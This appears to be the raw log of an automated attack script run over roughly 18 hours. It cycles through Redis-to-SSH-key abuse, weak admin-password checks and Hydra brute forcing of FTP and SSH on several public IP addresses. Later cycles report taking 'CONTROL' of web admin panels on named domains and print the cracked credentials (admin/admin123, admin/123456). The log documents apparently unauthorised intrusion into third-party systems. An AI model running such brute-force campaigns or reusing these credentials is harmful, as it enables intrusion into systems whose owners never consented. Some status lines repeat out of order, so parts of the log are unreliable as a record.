=== AUTO ATTACK Wed Aug  5 10:33:52 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
  brute 0.0.0.0
[*] FTP brute 0.0.0.0
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 10:33:52
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://0.0.0.0:21/
[STATUS] 59.00 tries/min, 59 tries in 00:01h, 158 to do in 00:03h, 3 active
[STATUS] 58.67 tries/min, 176 tries in 00:03h, 41 to do in 00:01h, 3 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-05 10:37:36
[*] SSH brute 0.0.0.0
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 10:37:36
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ssh://0.0.0.0:22/
[STATUS] 30.00 tries/min, 30 tries in 00:01h, 180 to do in 00:07h, 3 active
[STATUS] 21.00 tries/min, 63 tries in 00:03h, 147 to do in 00:08h, 3 active
[STATUS] 21.00 tries/min, 84 tries in 00:04h, 126 to do in 00:07h, 3 active
[STATUS] 22.40 tries/min, 112 tries in 00:05h, 98 to do in 00:05h, 3 active
[STATUS] 23.00 tries/min, 138 tries in 00:06h, 72 to do in 00:04h, 3 active
[STATUS] 21.86 tries/min, 153 tries in 00:07h, 57 to do in 00:03h, 3 active
[STATUS] 21.00 tries/min, 168 tries in 00:08h, 42 to do in 00:03h, 3 active
[STATUS] 21.67 tries/min, 195 tries in 00:09h, 15 to do in 00:01h, 3 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-05 10:47:25
[*] MySQL brute 0.0.0.0
  brute 1.14.148.140
[*] FTP brute 1.14.148.140
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 10:47:28
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://1.14.148.140:21/
[STATUS] 53.00 tries/min, 53 tries in 00:01h, 164 to do in 00:04h, 3 active
[STATUS] 54.00 tries/min, 162 tries in 00:03h, 55 to do in 00:02h, 3 active
[STATUS] 54.25 tries/min, 217 tries in 00:04h, 1 to do in 00:01h, 3 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-05 10:51:31
[*] SSH brute 1.14.148.140
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 10:51:31
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ssh://1.14.148.140:22/
[STATUS] 33.00 tries/min, 33 tries in 00:01h, 177 to do in 00:06h, 3 active
=== AUTO ATTACK Wed Aug  5 10:53:11 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
  brute 1.14.148.140
[*] FTP brute 1.14.148.140
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 10:53:11
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://1.14.148.140:21/
[STATUS] 52.00 tries/min, 52 tries in 00:01h, 165 to do in 00:04h, 3 active
[STATUS] 22.67 tries/min, 68 tries in 00:03h, 142 to do in 00:07h, 3 active
[STATUS] 23.25 tries/min, 93 tries in 00:04h, 117 to do in 00:06h, 3 active
[STATUS] 54.00 tries/min, 162 tries in 00:03h, 55 to do in 00:02h, 3 active
[STATUS] 23.40 tries/min, 117 tries in 00:05h, 93 to do in 00:04h, 3 active
[STATUS] 53.50 tries/min, 214 tries in 00:04h, 3 to do in 00:01h, 3 active
1 of 1 target completed, 0 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-05 10:57:14
[*] SSH brute 1.14.148.140
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 10:57:14
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ssh://1.14.148.140:22/
[STATUS] 23.83 tries/min, 143 tries in 00:06h, 67 to do in 00:03h, 3 active
[STATUS] 33.00 tries/min, 33 tries in 00:01h, 177 to do in 00:06h, 3 active
[STATUS] 23.29 tries/min, 163 tries in 00:07h, 47 to do in 00:03h, 3 active
[STATUS] 22.62 tries/min, 181 tries in 00:08h, 29 to do in 00:02h, 3 active
[STATUS] 24.00 tries/min, 72 tries in 00:03h, 138 to do in 00:06h, 3 active
[STATUS] 23.11 tries/min, 208 tries in 00:09h, 2 to do in 00:01h, 3 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-05 11:01:04
[*] MySQL brute 1.14.148.140
[STATUS] 23.25 tries/min, 93 tries in 00:04h, 117 to do in 00:06h, 3 active
  brute 1.71.132.72
[*] FTP brute 1.71.132.72
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 11:01:52
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://1.71.132.72:21/
[STATUS] 24.60 tries/min, 123 tries in 00:05h, 87 to do in 00:04h, 3 active
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 207 to do in 00:35h, 3 active
[STATUS] 24.00 tries/min, 144 tries in 00:06h, 66 to do in 00:03h, 3 active
[STATUS] 24.00 tries/min, 168 tries in 00:07h, 42 to do in 00:02h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 199 to do in 00:34h, 3 active
[STATUS] 22.88 tries/min, 183 tries in 00:08h, 27 to do in 00:02h, 3 active
[STATUS] 23.33 tries/min, 210 tries in 00:09h, 1 to do in 00:01h, 1 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-05 11:06:57
[*] MySQL brute 1.14.148.140
  brute 1.71.132.72
[*] FTP brute 1.71.132.72
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 11:07:28
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://1.71.132.72:21/
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 207 to do in 00:35h, 3 active
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 175 to do in 00:30h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 199 to do in 00:34h, 3 active
[STATUS] 5.75 tries/min, 69 tries in 00:12h, 148 to do in 00:26h, 3 active
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 175 to do in 00:30h, 3 active
[STATUS] 5.77 tries/min, 75 tries in 00:13h, 142 to do in 00:25h, 3 active
[STATUS] 5.79 tries/min, 81 tries in 00:14h, 136 to do in 00:24h, 3 active
[STATUS] 5.73 tries/min, 86 tries in 00:15h, 131 to do in 00:23h, 3 active
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
[STATUS] 5.75 tries/min, 69 tries in 00:12h, 148 to do in 00:26h, 3 active
[STATUS] 5.77 tries/min, 75 tries in 00:13h, 142 to do in 00:25h, 3 active
[STATUS] 5.79 tries/min, 81 tries in 00:14h, 136 to do in 00:24h, 3 active
[STATUS] 5.73 tries/min, 86 tries in 00:15h, 131 to do in 00:23h, 3 active
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
  brute 101.132.131.122
[*] FTP brute 101.132.131.122
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 11:22:28
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://101.132.131.122:21/
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 207 to do in 00:35h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 199 to do in 00:34h, 3 active
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 175 to do in 00:30h, 3 active
[STATUS] 5.75 tries/min, 69 tries in 00:12h, 148 to do in 00:26h, 3 active
[STATUS] 5.77 tries/min, 75 tries in 00:13h, 142 to do in 00:25h, 3 active
[STATUS] 5.79 tries/min, 81 tries in 00:14h, 136 to do in 00:24h, 3 active
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
=== AUTO ATTACK Wed Aug  5 11:37:32 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
  brute 101.132.131.122
[*] FTP brute 101.132.131.122
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 11:37:32
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://101.132.131.122:21/
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 207 to do in 00:35h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 199 to do in 00:34h, 3 active
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 175 to do in 00:30h, 3 active
=== AUTO ATTACK Wed Aug  5 11:47:47 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
  brute 101.132.131.122
[*] FTP brute 101.132.131.122
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 11:47:47
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://101.132.131.122:21/
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 207 to do in 00:35h, 3 active
[STATUS] 5.75 tries/min, 69 tries in 00:12h, 148 to do in 00:26h, 3 active
[STATUS] 5.77 tries/min, 75 tries in 00:13h, 142 to do in 00:25h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 199 to do in 00:34h, 3 active
[STATUS] 5.79 tries/min, 81 tries in 00:14h, 136 to do in 00:24h, 3 active
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
  brute 101.132.248.167
[*] FTP brute 101.132.248.167
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 11:52:32
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://101.132.248.167:21/
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 207 to do in 00:35h, 3 active
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 175 to do in 00:30h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 199 to do in 00:34h, 3 active
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 175 to do in 00:30h, 3 active
[STATUS] 5.75 tries/min, 69 tries in 00:12h, 148 to do in 00:26h, 3 active
[STATUS] 5.77 tries/min, 75 tries in 00:13h, 142 to do in 00:25h, 3 active
[STATUS] 5.79 tries/min, 81 tries in 00:14h, 136 to do in 00:24h, 3 active
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
  brute 101.132.248.167
[*] FTP brute 101.132.248.167
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 12:02:48
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://101.132.248.167:21/
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 207 to do in 00:35h, 3 active
[STATUS] 5.75 tries/min, 69 tries in 00:12h, 148 to do in 00:26h, 3 active
[STATUS] 5.77 tries/min, 75 tries in 00:13h, 142 to do in 00:25h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 199 to do in 00:34h, 3 active
[STATUS] 5.79 tries/min, 81 tries in 00:14h, 136 to do in 00:24h, 3 active
=== AUTO ATTACK Wed Aug  5 12:07:32 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
[3] port brute
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
  brute 101.132.248.167
[*] FTP brute 101.132.248.167
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 12:07:32
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://101.132.248.167:21/
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 207 to do in 00:35h, 3 active
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 175 to do in 00:30h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 199 to do in 00:34h, 3 active
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 175 to do in 00:30h, 3 active
[STATUS] 5.75 tries/min, 69 tries in 00:12h, 148 to do in 00:26h, 3 active
[STATUS] 5.77 tries/min, 75 tries in 00:13h, 142 to do in 00:25h, 3 active
[STATUS] 5.79 tries/min, 81 tries in 00:14h, 136 to do in 00:24h, 3 active
=== AUTO ATTACK Wed Aug  5 12:17:47 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
[3] port brute
  brute 101.132.248.167
[*] FTP brute 101.132.248.167
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 12:17:50
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
[DATA] attacking ftp://101.132.248.167:21/
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 207 to do in 00:35h, 3 active
[STATUS] 5.75 tries/min, 69 tries in 00:12h, 148 to do in 00:26h, 3 active
[STATUS] 5.77 tries/min, 75 tries in 00:13h, 142 to do in 00:25h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 199 to do in 00:34h, 3 active
[STATUS] 5.79 tries/min, 81 tries in 00:14h, 136 to do in 00:24h, 3 active
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
=== AUTO ATTACK END Wed Aug  5 12:22:32 UTC 2026 ===
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 175 to do in 00:30h, 3 active
[STATUS] 5.75 tries/min, 69 tries in 00:12h, 148 to do in 00:26h, 3 active
[STATUS] 5.77 tries/min, 75 tries in 00:13h, 142 to do in 00:25h, 3 active
[STATUS] 5.79 tries/min, 81 tries in 00:14h, 136 to do in 00:24h, 3 active
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
=== AUTO ATTACK END Wed Aug  5 12:32:50 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 13:04:09 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 13:04:17 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 13:32:20 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 13:32:28 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 13:46:01 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 13:46:08 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 13:56:29 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 13:56:36 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 14:47:44 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 14:47:50 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 14:58:59 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 14:59:07 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 15:45:54 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 15:46:01 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 15:54:41 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 15:54:49 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 16:48:59 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 16:49:07 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 16:58:39 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 16:58:46 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 17:48:20 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 17:48:27 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 17:57:33 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 17:57:38 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 18:47:00 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 18:47:07 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 18:56:22 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 18:56:30 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 19:46:53 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 19:47:00 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 19:54:53 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 19:55:00 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 20:45:45 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 20:45:51 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 20:56:47 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 20:56:54 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 21:46:24 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 21:46:31 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 21:56:34 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 21:56:43 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 22:46:52 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 22:46:59 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 22:55:48 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 22:55:55 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 23:46:36 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 23:46:43 UTC 2026 ===
=== AUTO ATTACK Wed Aug  5 23:56:43 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
  admin 85725987.com
recorded: webadmin 85725987.com
  !!! CONTROL 85725987.com admin/admin123
[3] port brute
=== AUTO ATTACK END Wed Aug  5 23:56:51 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 00:44:57 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 00:45:11 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 00:52:44 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 00:52:55 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 01:46:28 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 01:46:42 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 01:56:43 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 01:56:54 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 02:47:41 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 02:47:56 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 02:56:55 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/admin123 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 02:57:07 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 03:47:40 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 03:47:54 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 03:57:50 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
  admin 40up.com
recorded: webadmin 40up.com
  !!! CONTROL 40up.com admin/123456 loc=http://survey-smiles.com
  admin 85725987.com
[3] port brute
=== AUTO ATTACK END Thu Aug  6 03:58:01 UTC 2026 ===
=== AUTO ATTACK Thu Aug  6 04:47:39 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 220-host.wilcoxon.com
